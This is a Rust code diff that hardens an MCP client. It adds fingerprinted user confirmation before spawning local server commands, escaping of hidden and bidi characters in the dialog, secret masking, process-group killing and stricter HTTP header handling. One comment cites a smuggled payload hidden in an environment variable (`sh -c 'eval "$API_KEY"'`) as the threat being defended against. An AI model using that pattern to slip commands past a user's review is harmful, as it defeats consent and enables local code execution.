@@ -6,7 +6,7 @@
 //! 与 Stdio(子进程 piped stdin/stdout,stderr 丢弃,读线程逐行投递;子进程退出即标记 dead)。
 //! 铁律:`HOROSA_MCP_CLIENT=0` 一票否决;响应体 ≤1MiB;`redact_spec` 后才回页面(headers → hasAuth);
 //! 退出/关开关 = 断所有连接 + 杀子进程。**本模块永不执行工具,只搬运** JSON-RPC。
-use std::collections::HashMap;
+use std::collections::{BTreeMap, HashMap, HashSet};
 use std::io::{BufRead, BufReader, Read, Write};
 use std::path::{Path, PathBuf};
 use std::process::{Child, Command, Stdio};
@@ -25,6 +25,9 @@ use crate::mcp_server::{
 };
 
 pub const MCP_CLIENTS_FILE: &str = "mcp-clients.json";
+/// 用户亲手确认过的本机命令(stdio 外部服务器)指纹:只由壳在原生确认框点「允许」后写入,页面写不到
+/// (upsert 只改 mcp-clients.json;页面一次 IPC 改了命令 / 参数 / 环境 / 目录 ⇒ 指纹变 ⇒ 下次连接重新确认)。
+pub const MCP_APPROVED_FILE: &str = "mcp-clients-approved.json";
 pub const MCP_CLIENT_KILL_ENV: &str = "HOROSA_MCP_CLIENT";
 pub const EXT_PREFIX: &str = "ext_";
 const MAX_RESPONSE_BYTES: usize = 1 << 20;
@@ -221,8 +224,9 @@ enum Conn {
         session: Option<String>,
     },
     Stdio {
-        child: Child,
-        stdin: std::process::ChildStdin,
+        /// 子进程句柄单独加锁(只在 try_wait / kill / wait 的一瞬持有):断开方不必等连接锁就能先杀进程
+        child: Arc<Mutex<Child>>,
+        stdin: StdinWriter,
         rx: mpsc::Receiver<String>,
     },
 }
@@ -231,17 +235,127 @@ enum Conn {
 impl Drop for Conn {
     fn drop(&mut self) {
         if let Conn::Stdio { child, .. } = self {
-            let _ = child.kill();
-            let _ = child.wait();
+            kill_child(child);
+            if let Ok(mut c) = child.lock() {
+                let _ = c.wait();
+            }
         }
     }
 }
 
+/// 杀子进程(连同它起的整个进程组:`npx` 一类启动器会再起真正的服务器进程,只杀启动器的话
+/// 服务器进程还攥着 stdout,在途调用照样等到超时)。只在子进程尚未被回收时按组发信号,避免误伤复用的进程号。
+fn kill_child(child: &Mutex<Child>) {
+    if let Ok(mut c) = child.lock() {
+        if let Ok(None) = c.try_wait() {
+            #[cfg(unix)]
+            {
+                let pgid = c.id() as libc::pid_t;
+                if pgid > 1 {
+                    // SAFETY: 只发信号,不涉及内存;目标是本连接起的进程组(子进程未回收,组号不会被复用)
+                    unsafe {
+                        libc::kill(-pgid, libc::SIGKILL);
+                    }
+                }
+            }
+            let _ = c.kill();
+        }
+    }
+}
+
+/// 子进程是否已退出(已退出则顺带回收)。
+fn child_exited(child: &Mutex<Child>) -> Option<std::process::ExitStatus> {
+    child
+        .lock()
+        .ok()
+        .and_then(|mut c| c.try_wait().ok().flatten())
+}
+
+/// 子进程 stdin 的专用写线程:对方不读时写会阻塞(管道缓冲满),阻塞只发生在这里;调用方按截止时间等回执。
+struct StdinWriter {
+    tx: mpsc::Sender<StdinJob>,
+}
+
+type StdinJob = (Vec<u8>, Option<mpsc::Sender<std::io::Result<()>>>);
+
+impl StdinWriter {
+    fn spawn(mut stdin: std::process::ChildStdin) -> Result<StdinWriter> {
+        let (tx, rx) = mpsc::channel::<StdinJob>();
+        thread::Builder::new()
+            .name("mcp-stdio-writer".into())
+            .spawn(move || {
+                for (bytes, ack) in rx {
+                    let r = stdin.write_all(&bytes).and_then(|_| stdin.flush());
+                    let failed = r.is_err();
+                    if let Some(ack) = ack {
+                        let _ = ack.send(r);
+                    }
+                    if failed {
+                        break;
+                    }
+                }
+            })
+            .context("spawn stdin writer")?;
+        Ok(StdinWriter { tx })
+    }
+
+    fn job(line: &str) -> Vec<u8> {
+        let mut bytes = Vec::with_capacity(line.len() + 1);
+        bytes.extend_from_slice(line.as_bytes());
+        bytes.push(b'\n');
+        bytes
+    }
+
+    /// 写一行并等写线程回执,最多等到 `deadline`。
+    fn write_line(&self, line: &str, deadline: Instant) -> Result<()> {
+        let (ack_tx, ack_rx) = mpsc::channel();
+        self.tx
+            .send((Self::job(line), Some(ack_tx)))
+            .map_err(|_| anyhow!("server stdin closed"))?;
+        match ack_rx.recv_timeout(deadline.saturating_duration_since(Instant::now())) {
+            Ok(Ok(())) => Ok(()),
+            Ok(Err(e)) => Err(anyhow!("write to server stdin: {}", e)),
+            Err(mpsc::RecvTimeoutError::Timeout) => Err(anyhow!("timeout writing to server stdin")),
+            Err(mpsc::RecvTimeoutError::Disconnected) => Err(anyhow!("server stdin closed")),
+        }
+    }
+
+    /// 只排队不等回执(通知:与后续请求同一写线程,先后顺序不变)。
+    fn send_line(&self, line: &str) {
+        let _ = self.tx.send((Self::job(line), None));
+    }
+}
+
+/// 连接表的一项:连接锁(在途调用全程持有)之外另存子进程句柄 ——
+/// 断开 / 退出时先杀进程,在途调用随即因 stdout 关闭而返回并放锁,断开方从不等这把锁。
+struct ConnEntry {
+    live: Mutex<Live>,
+    child: Option<Arc<Mutex<Child>>>,
+}
+
+impl ConnEntry {
+    fn kill(&self) {
+        if let Some(c) = self.child.as_ref() {
+            kill_child(c);
+        }
+    }
+}
+
+/// 起本机命令前的确认:入参是服务器名与给人看的完整命令行(命令 / 参数 / 工作目录 / 环境变量),回 true = 用户允许。
+pub type StdioConfirm = Arc<dyn Fn(&str, &str) -> bool + Send + Sync>;
+
 pub struct ClientState {
     dir: Mutex<Option<PathBuf>>,
     specs: Mutex<Vec<ServerSpec>>,
-    conns: Mutex<HashMap<String, Arc<Mutex<Live>>>>,
+    conns: Mutex<HashMap<String, Arc<ConnEntry>>>,
+    /// 每个服务器的「连接作废代次」:用户断开 / 改了传输方式(命令 · 参数 · 环境 · 网址)/ 删除时 +1。
+    /// 在途的 connect 握手前记下代次,插表前(持 conns 锁)核对 —— 不一致 = 握手期间被作废,丢弃这条连接。
+    /// 锁序:conns → conn_gen(disconnect 与插表都按这个顺序拿)
+    conn_gen: Mutex<HashMap<String, u64>>,
     seq: AtomicU64,
+    approved: Mutex<HashSet<String>>,
+    /// 缺省没有确认器 = 一律不起(fail-closed);桌面壳装原生确认框(native_stdio_confirm)
+    confirm: Mutex<Option<StdioConfirm>>,
 }
 
 impl Default for ClientState {
@@ -250,17 +364,265 @@ impl Default for ClientState {
             dir: Mutex::new(None),
             specs: Mutex::new(Vec::new()),
             conns: Mutex::new(HashMap::new()),
+            conn_gen: Mutex::new(HashMap::new()),
             seq: AtomicU64::new(1),
+            approved: Mutex::new(HashSet::new()),
+            confirm: Mutex::new(None),
         }
     }
 }
 
+/// stdio 规格的指纹(命令 + 参数 + 工作目录 + 环境变量键值,规范化后 sha256);http 规格回 None(不起本机进程)
+pub fn stdio_fingerprint(spec: &ServerSpec) -> Option<String> {
+    use sha2::{Digest, Sha256};
+    match &spec.transport {
+        Transport::Stdio {
+            command,
+            args,
+            env,
+            cwd,
+        } => {
+            let env: BTreeMap<&String, &String> = env.iter().collect();
+            let canon = json!({ "command": command, "args": args, "env": env, "cwd": cwd.clone().unwrap_or_default() });
+            let digest = Sha256::digest(canon.to_string().as_bytes());
+            Some(digest.iter().map(|b| format!("{b:02x}")).collect())
+        }
+        Transport::Http { .. } => None,
+    }
+}
+
+fn shell_quote_display(s: &str) -> String {
+    if !s.is_empty()
+        && s.chars()
+            .all(|c| c.is_ascii_alphanumeric() || "-_./=:@%+,".contains(c))
+    {
+        s.to_string()
+    } else {
+        format!("'{}'", s.replace('\'', "'\\''"))
+    }
+}
+
+/// 确认框里单个字段最多显示的字符数(超出截断并注明总长:框里放不下的部分不许悄悄挤到框外)
+const DISPLAY_FIELD_MAX_CHARS: usize = 300;
+
+/// 显示时看不见、或会改写视觉顺序的字符:控制字符(含换行)、双向控制(U+202A–202E、U+2066–2069、U+200E/F、U+061C)、
+/// 零宽与其它不占位的格式字符。确认框里一律转义成可见的 `\n` / `\u{202E}`,否则载荷可以被换行挤出框外、或被倒序伪装。
+fn is_hidden_or_bidi(c: char) -> bool {
+    c.is_control()
+        || matches!(c as u32,
+            0x00AD | 0x034F | 0x061C | 0x115F | 0x1160 | 0x17B4 | 0x17B5 | 0x180B..=0x180F
+            | 0x200B..=0x200F | 0x2028..=0x202E | 0x205F..=0x206F | 0x3164 | 0xFE00..=0xFE0F
+            | 0xFEFF | 0xFFA0 | 0xFFF0..=0xFFFB | 0xE0000..=0xE0FFF)
+}
+
+/// 给确认框用的可见化:反斜杠自身先转义(与真换行可区分),不可见 / 双向字符转义,过长截断并注明总长
+pub fn display_escape(s: &str) -> String {
+    let total = s.chars().count();
+    let mut out = String::new();
+    for (i, c) in s.chars().enumerate() {
+        if i >= DISPLAY_FIELD_MAX_CHARS {
+            out.push_str(&format!("…(共 {total} 个字符,后 {} 个未显示)", total - i));
+            break;
+        }
+        match c {
+            '\\' => out.push_str("\\\\"),
+            '\n' => out.push_str("\\n"),
+            '\r' => out.push_str("\\r"),
+            '\t' => out.push_str("\\t"),
+            c if is_hidden_or_bidi(c) => out.push_str(&format!("\\u{{{:04X}}}", c as u32)),
+            c => out.push(c),
+        }
+    }
+    out
+}
+
+fn display_field(s: &str) -> String {
+    shell_quote_display(&display_escape(s))
+}
+
+/// 值像不像一枚密钥 / 令牌(只含 ASCII 字母数字与 `-_.~+/=:`):像才隐藏;含空白、shell 符号或非 ASCII 的
+/// 不是令牌的样子(更像藏进环境变量的载荷,如 `sh -c 'eval "$API_KEY"'`),原样显示
+fn looks_like_token(v: &str) -> bool {
+    !v.is_empty()
+        && v.chars()
+            .all(|c| c.is_ascii_alphanumeric() || "-_.~+/=:".contains(c))
+}
+
+fn short_sha256(v: &str) -> String {
+    use sha2::{Digest, Sha256};
+    Sha256::digest(v.as_bytes())
+        .iter()
+        .take(4)
+        .map(|b| format!("{b:02x}"))
+        .collect()
+}
+
+/// 给人看的完整命令行(确认框里显示的就是它):命令与参数(不可见字符转义、过长截断)、工作目录、环境变量
+/// (名字像密钥且值像令牌的只显示长度与 sha256 前 8 位;命令行引用了它就注明)
+pub fn stdio_command_display(spec: &ServerSpec) -> String {
+    match &spec.transport {
+        Transport::Stdio {
+            command,
+            args,
+            env,
+            cwd,
+        } => {
+            let mut line = std::iter::once(command.as_str())
+                .chain(args.iter().map(|a| a.as_str()))
+                .map(display_field)
+                .collect::<Vec<_>>()
+                .join(" ");
+            if let Some(d) = cwd.as_ref().filter(|d| !d.trim().is_empty()) {
+                line.push_str(&format!("\n工作目录:{}", display_escape(d)));
+            }
+            if !env.is_empty() {
+                let cmdline: String = std::iter::once(command.as_str())
+                    .chain(args.iter().map(|a| a.as_str()))
+                    .collect::<Vec<_>>()
+                    .join(" ");
+                let env: BTreeMap<&String, &String> = env.iter().collect();
+                let shown = env
+                    .iter()
+                    .map(|(k, v)| {
+                        let up = k.to_ascii_uppercase();
+                        let referenced = cmdline.contains(&format!("${k}"))
+                            || cmdline.contains(&format!("${{{k}}}"))
+                            || cmdline.contains(&format!("%{k}%"));
+                        let note = if referenced { ";命令行引用了这个变量" } else { "" };
+                        let key = display_escape(k);
+                        if ["KEY", "TOKEN", "SECRET", "PASSWORD", "PASS"].iter().any(|w| up.contains(w)) {
+                            if looks_like_token(v) {
+                                format!(
+                                    "{key}=(已隐藏:{} 个字符,sha256 前 8 位 {}{note})",
+                                    v.chars().count(),
+                                    short_sha256(v)
+                                )
+                            } else {
+                                format!(
+                                    "{key}={}(名字像密钥,但值含空白 / 符号 / 非 ASCII,不像令牌,原样显示{note})",
+                                    display_field(v)
+                                )
+                            }
+                        } else if referenced {
+                            format!("{key}={}(命令行引用了这个变量)", display_field(v))
+                        } else {
+                            format!("{key}={}", display_field(v))
+                        }
+                    })
+                    .collect::<Vec<_>>()
+                    .join("\n  ");
+                line.push_str(&format!("\n环境变量:\n  {shown}"));
+            }
+            line
+        }
+        Transport::Http { url, .. } => display_escape(url),
+    }
+}
+
+/// 桌面壳的原生确认框(连接动作由用户在「外部连接」面板点出,弹窗因用户操作而起)
+pub fn native_stdio_confirm(name: &str, display: &str) -> bool {
+    use rfd::{MessageButtons, MessageDialog, MessageDialogResult, MessageLevel};
+    MessageDialog::new()
+        .set_level(MessageLevel::Warning)
+        .set_title(crate::shell_text::shell_text("dlg.stdio_confirm.title"))
+        .set_description(crate::shell_text::shell_text_fmt(
+            "dlg.stdio_confirm.body",
+            &[
+                ("name", display_escape(name).as_str()),
+                ("display", display),
+            ],
+        ))
+        .set_buttons(MessageButtons::YesNo)
+        .show()
+        == MessageDialogResult::Yes
+}
+
 impl ClientState {
+    pub fn with_stdio_confirm(confirm: StdioConfirm) -> Self {
+        let s = Self::default();
+        if let Ok(mut c) = s.confirm.lock() {
+            *c = Some(confirm);
+        }
+        s
+    }
     pub fn bind_dir(&self, dir: &Path) {
         if let Ok(mut d) = self.dir.lock() {
             *d = Some(dir.to_path_buf());
         }
         let _ = self.load();
+        let _ = self.load_approved();
+    }
+    fn approved_file(&self) -> Option<PathBuf> {
+        self.dir
+            .lock()
+            .ok()
+            .and_then(|d| d.clone())
+            .map(|d| d.join(MCP_APPROVED_FILE))
+    }
+    fn load_approved(&self) -> Result<()> {
+        let Some(path) = self.approved_file() else {
+            return Ok(());
+        };
+        let list: Vec<String> = std::fs::read_to_string(&path)
+            .ok()
+            .and_then(|t| serde_json::from_str(&t).ok())
+            .unwrap_or_default();
+        if let Ok(mut a) = self.approved.lock() {
+            *a = list.into_iter().collect();
+        }
+        Ok(())
+    }
+    fn save_approved(&self) -> Result<()> {
+        let Some(path) = self.approved_file() else {
+            return Ok(());
+        };
+        let mut list: Vec<String> = self
+            .approved
+            .lock()
+            .map(|a| a.iter().cloned().collect())
+            .unwrap_or_default();
+        list.sort();
+        write_private_file(&path, &serde_json::to_vec_pretty(&list)?)
+            .with_context(|| format!("write {}", path.display()))
+    }
+    /// 起本机命令前的闸:指纹已确认过 ⇒ 放行;否则问确认器(没有确认器 = 拒),允许了才记下指纹。
+    /// allow_prompt=false(AI 间接调用触发的自动重连):没确认过就直接拒,不弹框 —— 确认框只因用户在面板点「连接」而起,
+    /// 不在 AI 对话 / 后台任务中途冒出来(用户没有上下文,容易顺手点允许)。
+    fn ensure_stdio_approved(&self, spec: &ServerSpec, allow_prompt: bool) -> Result<()> {
+        let Some(fp) = stdio_fingerprint(spec) else {
+            return Ok(());
+        };
+        if self
+            .approved
+            .lock()
+            .map(|a| a.contains(&fp))
+            .unwrap_or(false)
+        {
+            return Ok(());
+        }
+        if !allow_prompt {
+            return Err(anyhow!(
+                "外部服务器「{}」未连接,且这条本机命令还没确认过(首次使用或命令有改动):请在「外部连接」面板点「连接」确认后再用",
+                display_escape(&spec.name)
+            ));
+        }
+        let confirm = self.confirm.lock().ok().and_then(|c| c.clone());
+        let display = stdio_command_display(spec);
+        let ok = match confirm {
+            Some(f) => f(&spec.name, &display),
+            None => false,
+        };
+        if !ok {
+            return Err(anyhow!(
+                "本机命令未经确认,不启动(外部服务器「{}」首次连接或命令有改动时要在确认框里允许):{}",
+                display_escape(&spec.name),
+                display.lines().next().unwrap_or("")
+            ));
+        }
+        if let Ok(mut a) = self.approved.lock() {
+            a.insert(fp);
+        }
+        self.save_approved()
     }
     fn file(&self) -> Option<PathBuf> {
         self.dir
@@ -310,12 +672,13 @@ impl ClientState {
     pub fn upsert(&self, spec: ServerSpec) -> Result<Value> {
         self.upsert_keeping(spec, false)
     }
-    /// [Q-294/M-109·AR-24] keep_headers=true 且来稿 http headers 为空:沿用同 id 旧稿的 headers(面板「编辑」令牌框留空 = 保留已存令牌;
+    /// keep_headers=true 且来稿 http headers 为空:沿用同 id 旧稿的 headers(面板「编辑」令牌框留空 = 保留已存令牌;
     /// 此前整份覆盖把令牌清空)。来稿带了 headers 或旧稿不是 http ⇒ 与普通 upsert 相同。
     pub fn upsert_keeping(&self, mut spec: ServerSpec, keep_headers: bool) -> Result<Value> {
         if spec.id.trim().is_empty() {
             return Err(anyhow!("server id required"));
         }
+        let mut transport_changed = false;
         {
             let mut specs = self.specs.lock().map_err(|_| anyhow!("lock"))?;
             if let Some(i) = specs.iter().position(|s| s.id == spec.id) {
@@ -336,6 +699,7 @@ impl ClientState {
                         }
                     }
                 }
+                transport_changed = specs[i].transport != spec.transport;
                 specs[i] = spec.clone();
             } else {
                 if specs.len() >= MAX_SERVERS {
@@ -344,8 +708,14 @@ impl ClientState {
                 specs.push(spec.clone());
             }
         }
+        // 改了命令 / 参数 / 环境 / 网址:旧连接(旧进程、旧工具清单)立刻断开 —— 否则旧进程继续服务,
+        // 掉线后再由 AI 调用自动重连到「没确认过的新命令」。回包带 disconnected,页面据此收回该服务器的外部工具。
+        let disconnected = transport_changed && self.disconnect(&spec.id);
         self.save()?;
-        Ok(redact_spec(&spec))
+        let mut out = redact_spec(&spec);
+        out["disconnected"] = json!(disconnected);
+        out["transportChanged"] = json!(transport_changed);
+        Ok(out)
     }
     pub fn remove(&self, id: &str) -> Result<bool> {
         self.disconnect(id);
@@ -366,28 +736,45 @@ impl ClientState {
             .ok()
             .and_then(|s| s.iter().find(|x| x.id == id).cloned())
     }
+    /// 断开(用户断开 / 改了传输方式 / 删除):摘表并作废在途的 connect(代次 +1)→ 杀子进程(不碰连接锁)
+    /// → 连接本体由最后一个持有者放手时回收。在途调用还攥着连接锁也不等它:进程一死它就因 stdout 关闭而返回。
+    /// 此前在途 connect 不受影响:握手期间改了命令,upsert 时表里还没有这条 → 回 disconnected:false,
+    /// 握手完成后按旧命令起的进程照样插进连接表,AI 之后的调用都打到旧命令上。
     pub fn disconnect(&self, id: &str) -> bool {
-        let taken = self.conns.lock().ok().and_then(|mut c| c.remove(id));
-        if let Some(conn) = taken {
-            if let Ok(mut c) = conn.lock() {
-                if let Conn::Stdio { child, .. } = &mut c.conn {
-                    let _ = child.kill();
-                    let _ = child.wait();
-                }
+        let taken = self.conns.lock().ok().and_then(|mut c| {
+            if let Ok(mut g) = self.conn_gen.lock() {
+                *g.entry(id.to_string()).or_insert(0) += 1;
             }
-            return true;
-        }
-        false
+            c.remove(id)
+        });
+        Self::kill_taken(taken)
     }
-    pub fn disconnect_all(&self) {
-        let ids = self
-            .conns
-            .lock()
-            .map(|c| c.keys().cloned().collect::<Vec<_>>())
-            .unwrap_or_default();
-        for id in ids {
-            self.disconnect(&id);
+    /// 连接自身重连前摘掉旧连接:不作废别的在途 connect(两路 AI 调用同时首连同一服务器不互相判废)
+    fn drop_conn(&self, id: &str) -> bool {
+        let taken = self.conns.lock().ok().and_then(|mut c| c.remove(id));
+        Self::kill_taken(taken)
+    }
+    fn kill_taken(taken: Option<Arc<ConnEntry>>) -> bool {
+        match taken {
+            Some(entry) => {
+                entry.kill();
+                true
+            }
+            None => false,
         }
+    }
+    fn conn_gen_of(&self, id: &str) -> u64 {
+        self.conn_gen
+            .lock()
+            .ok()
+            .and_then(|g| g.get(id).copied())
+            .unwrap_or(0)
+    }
+    fn take_all(&self) -> Vec<Arc<ConnEntry>> {
+        self.conns
+            .lock()
+            .map(|mut c| c.drain().map(|(_, e)| e).collect())
+            .unwrap_or_default()
     }
     fn next_id(&self) -> u64 {
         self.seq.fetch_add(1, Ordering::SeqCst)
@@ -396,6 +783,11 @@ impl ClientState {
     /// 连接:先探测纪元(server/discover),现代服务器直接 tools/list(每请求 _meta),旧服务器 initialize + initialized + tools/list;
     /// 回 { serverId, era, protocolVersion, serverInfo, tools:[原始工具] }(页面只读 tools;多出的字段无害)。
     pub fn connect(&self, id: &str) -> Result<Value> {
+        self.connect_inner(id, true)
+    }
+
+    /// allow_prompt:是否允许为没确认过的本机命令弹确认框(只有用户在面板点「连接」时为 true)
+    fn connect_inner(&self, id: &str, allow_prompt: bool) -> Result<Value> {
         if !client_allowed() {
             return Err(anyhow!(
                 "external MCP client disabled by {}=0",
@@ -408,7 +800,10 @@ impl ClientState {
         if !spec.enabled {
             return Err(anyhow!("server disabled: {}", id));
         }
-        self.disconnect(id);
+        self.drop_conn(id);
+        let gen0 = self.conn_gen_of(id);
+        // 页面一次 IPC 就能写进任意命令行:起进程前必须是用户在原生确认框里亲手允许过的这一条(指纹)
+        self.ensure_stdio_approved(&spec, allow_prompt)?;
         let mut conn = open_conn(&spec)?;
         let era = probe_era(&mut conn, &spec, self.next_id())?;
         let mut live = Live {
@@ -463,8 +858,35 @@ impl ClientState {
         };
         let tools: Vec<Value> = tools.into_iter().take(MAX_TOOLS_PER_SERVER).collect();
         live.tools = tools.clone();
-        if let Ok(mut c) = self.conns.lock() {
-            c.insert(id.to_string(), Arc::new(Mutex::new(live)));
+        let child = match &live.conn {
+            Conn::Stdio { child, .. } => Some(Arc::clone(child)),
+            Conn::Http { .. } => None,
+        };
+        {
+            // 插表前(持 conns 锁,与 disconnect 同锁序)核对:握手期间没被断开 / 没改传输方式 / 没删 / 没停用;
+            // 否则丢弃这条连接(Conn 的 Drop 杀掉按旧规格起的进程组)
+            let mut c = self.conns.lock().map_err(|_| anyhow!("lock"))?;
+            let current = self.spec_of(id);
+            let still = self.conn_gen_of(id) == gen0
+                && current
+                    .as_ref()
+                    .map(|s| s.enabled && s.transport == spec.transport)
+                    .unwrap_or(false);
+            if !still {
+                drop(c);
+                drop(live);
+                return Err(anyhow!(
+                    "server {} was disconnected or its settings changed while connecting; connect again",
+                    id
+                ));
+            }
+            c.insert(
+                id.to_string(),
+                Arc::new(ConnEntry {
+                    live: Mutex::new(live),
+                    child,
+                }),
+            );
         }
         Ok(json!({
             "serverId": id,
@@ -475,7 +897,8 @@ impl ClientState {
         }))
     }
 
-    /// 调用外部工具(原始工具名);未连接先连;壳侧准入(与页面同规则)先于发送。结果原样回页面(页面负责包 untrusted 信封)。
+    /// 调用外部工具(原始工具名);未连接先连(只连 http 或已确认过的本机命令,绝不因 AI 调用弹确认框);
+    /// 壳侧准入(与页面同规则)先于发送。结果原样回页面(页面负责包 untrusted 信封)。
     pub fn call(&self, id: &str, tool: &str, arguments: Value) -> Result<Value> {
         if !client_allowed() {
             return Err(anyhow!(
@@ -494,7 +917,7 @@ impl ClientState {
             match existing {
                 Some(c) => c,
                 None => {
-                    self.connect(id)?;
+                    self.connect_inner(id, false)?;
                     self.conns
                         .lock()
                         .ok()
@@ -503,7 +926,7 @@ impl ClientState {
                 }
             }
         };
-        let mut guard = live.lock().map_err(|_| anyhow!("conn lock"))?;
+        let mut guard = live.live.lock().map_err(|_| anyhow!("conn lock"))?;
         admit_tool(&spec, &guard.tools, tool)?;
         let out = rpc_raw(
             &mut guard,
@@ -523,7 +946,7 @@ impl ClientState {
 /// 只读档(read_only_only=true,缺省):只放行「annotations.readOnlyHint===true」的工具,allow_tools **不**放行写工具;
 /// 按清单档:readOnlyHint 或「在 allow_tools 清单」二者居一(页面把清单里的写工具按写入级注册、走审批)。
 /// 此前只有页面判、直呼壳命令可绕过 —— 令牌持有者=受信本机进程,但只增不删的目录承诺要在最后一跳也成立。
-/// [Q-292] 此前两档条件完全相同(开关只改拒绝文案),只读档下清单里的写工具照样被放行。
+/// 此前两档条件完全相同(开关只改拒绝文案),只读档下清单里的写工具照样被放行。
 fn admit_tool(spec: &ServerSpec, tools: &[Value], name: &str) -> Result<()> {
     let Some(t) = tools
         .iter()
@@ -671,8 +1094,7 @@ fn notify_raw(live: &mut Live, spec: &ServerSpec, method: &str, params: Value) -
             let _ = b.body(req.to_string()).send();
         }
         Conn::Stdio { stdin, .. } => {
-            let _ = writeln!(stdin, "{}", req);
-            let _ = stdin.flush();
+            stdin.send_line(&req.to_string());
         }
     }
     Ok(())
@@ -775,9 +1197,26 @@ fn open_conn(spec: &ServerSpec) -> Result<Conn> {
             if !url.starts_with("http://") && !url.starts_with("https://") {
                 return Err(anyhow!("http transport requires http(s) url"));
             }
-            let client = reqwest::blocking::Client::builder()
+            let parsed = reqwest::Url::parse(url)
+                .map_err(|_| anyhow!("http transport requires http(s) url"))?;
+            // 自定义头(通常就是令牌)绝不明文发往别的机器:非本机回环的 http:// 地址带头一律拒连,请改用 https://
+            if parsed.scheme() == "http"
+                && !headers.is_empty()
+                && !crate::mcp_stdio::url_host_is_loopback(&parsed)
+            {
+                return Err(anyhow!(
+                    "refusing to send custom headers over plain http to a non-loopback host: use https://"
+                ));
+            }
+            let mut builder = reqwest::blocking::Client::builder()
                 .timeout(spec.timeout())
-                .build()?;
+                // 不跟随重定向:自定义头不能被 3xx 带去别的主机(3xx 按上游 HTTP 错误报出)
+                .redirect(reqwest::redirect::Policy::none());
+            // 本机回环上的服务一律直连:环境里的 HTTP(S)_PROXY / ALL_PROXY 不能把本机请求送进代理
+            if crate::mcp_stdio::url_host_is_loopback(&parsed) {
+                builder = builder.no_proxy();
+            }
+            let client = builder.build()?;
             Ok(Conn::Http {
                 client,
                 url: url.clone(),
@@ -800,17 +1239,39 @@ fn open_conn(spec: &ServerSpec) -> Result<Conn> {
                 .stdin(Stdio::piped())
                 .stdout(Stdio::piped())
                 .stderr(Stdio::null());
+            // 自成进程组:断开时连同它派生的进程一起杀(见 kill_child)
+            #[cfg(unix)]
+            {
+                use std::os::unix::process::CommandExt;
+                cmd.process_group(0);
+            }
             if let Some(d) = cwd.as_ref().filter(|d| !d.trim().is_empty()) {
                 cmd.current_dir(d);
             }
             let mut child = cmd.spawn().with_context(|| format!("spawn {}", command))?;
-            let stdin = child.stdin.take().ok_or_else(|| anyhow!("no stdin"))?;
-            let stdout = child.stdout.take().ok_or_else(|| anyhow!("no stdout"))?;
+            let stdin = child.stdin.take().ok_or_else(|| anyhow!("no stdin"));
+            let stdout = child.stdout.take().ok_or_else(|| anyhow!("no stdout"));
+            let child = Arc::new(Mutex::new(child));
+            // 后面任何一步失败都要把刚起的子进程收掉
+            let (stdin, stdout) = match (stdin, stdout) {
+                (Ok(i), Ok(o)) => (i, o),
+                (Err(e), _) | (_, Err(e)) => {
+                    kill_child(&child);
+                    return Err(e);
+                }
+            };
+            let stdin = match StdinWriter::spawn(stdin) {
+                Ok(w) => w,
+                Err(e) => {
+                    kill_child(&child);
+                    return Err(e);
+                }
+            };
             let (tx, rx) = mpsc::channel::<String>();
             thread::spawn(move || {
                 let mut reader = BufReader::new(stdout);
                 loop {
-                    // [压测二轮] 有界逐行读:一行超过 MAX_RESPONSE_BYTES 即判死(发一条错误帧后退出),
+                    // 有界逐行读:一行超过 MAX_RESPONSE_BYTES 即判死(发一条错误帧后退出),
                     // 不再「整块吃进内存再静默丢弃」——3MB 无换行的输出此前会先整块进内存,调用方只等到超时。
                     match read_line_bounded(&mut reader, MAX_RESPONSE_BYTES) {
                         Ok(None) => break,
@@ -898,7 +1359,7 @@ fn http_exchange(
         .and_then(|h| h.to_str().ok())
         .unwrap_or("")
         .to_lowercase();
-    // [压测二轮] 有界读:最多读 MAX_RESPONSE_BYTES+1 字节即判超限——一台只发 5MiB 就挂住不关闭的服务器不能让客户端等到超时、也不能让内存不设防
+    // 有界读:最多读 MAX_RESPONSE_BYTES+1 字节即判超限——一台只发 5MiB 就挂住不关闭的服务器不能让客户端等到超时、也不能让内存不设防
     let mut bytes: Vec<u8> = Vec::new();
     resp.take(MAX_RESPONSE_BYTES as u64 + 1)
         .read_to_end(&mut bytes)?;
@@ -1001,19 +1462,23 @@ pub fn sse_first_json(body: &str, want_id: Option<Value>) -> Result<Value> {
 }
 
 fn stdio_rpc(
-    stdin: &mut std::process::ChildStdin,
+    stdin: &StdinWriter,
     rx: &mpsc::Receiver<String>,
-    child: &mut Child,
+    child: &Mutex<Child>,
     req: &Value,
     want_id: u64,
     timeout: Duration,
 ) -> Result<Value> {
-    if let Ok(Some(status)) = child.try_wait() {
+    if let Some(status) = child_exited(child) {
         return Err(anyhow!("server process exited ({})", status));
     }
-    writeln!(stdin, "{}", req).context("write to server stdin")?;
-    stdin.flush().ok();
     let deadline = Instant::now() + timeout;
+    // 写也算进同一个超时预算:对方不读 stdin 时不再无限期卡住调用线程
+    if let Err(e) = stdin.write_line(&req.to_string(), deadline) {
+        // 写了半行的管道已破坏逐行分帧,这条连接作废:杀进程,下次调用如实报「进程已退出」
+        kill_child(child);
+        return Err(e);
+    }
     while Instant::now() < deadline {
         let left = deadline.saturating_duration_since(Instant::now());
         match rx.recv_timeout(left.min(Duration::from_millis(500))) {
@@ -1029,7 +1494,7 @@ fn stdio_rpc(
                 }
             }
             Err(mpsc::RecvTimeoutError::Timeout) => {
-                if let Ok(Some(status)) = child.try_wait() {
+                if let Some(status) = child_exited(child) {
                     return Err(anyhow!("server process exited ({})", status));
                 }
             }
@@ -1041,9 +1506,26 @@ fn stdio_rpc(
     Err(anyhow!("timeout waiting for server response"))
 }
 
-/// 退出臂:断所有连接(杀子进程);永不阻塞主线程。
+/// 退出臂:断所有连接(杀子进程);永不阻塞主线程 —— 摘表是一瞬的事,杀进程与回收丢后台线程
+/// (子进程句柄锁被占的一瞬也不在主线程上等)。
 pub fn stop_on_exit(state: &ClientState) {
-    state.disconnect_all();
+    let entries = state.take_all();
+    if entries.is_empty() {
+        return;
+    }
+    let spawned = thread::Builder::new()
+        .name("mcp-client-exit".into())
+        .spawn(move || {
+            for entry in entries {
+                entry.kill();
+            }
+        });
+    if let Err(e) = spawned {
+        crate::ledger_mark(
+            "rust.mcp_client_exit_cleanup_failed",
+            Some(json!({ "error": e.to_string() })),
+        );
+    }
 }
 
 #[cfg(test)]
@@ -1077,6 +1559,255 @@ mod tests {
         }
     }
 
+    /// 测试用:确认器一律允许(起本机命令的闸另有专门用例)
+    fn test_state() -> ClientState {
+        ClientState::with_stdio_confirm(Arc::new(|_: &str, _: &str| true))
+    }
+
+    /// 🔴 起本机命令必须先经用户确认:没确认器 / 确认器拒 ⇒ 不 spawn(子进程的标记文件不出现);
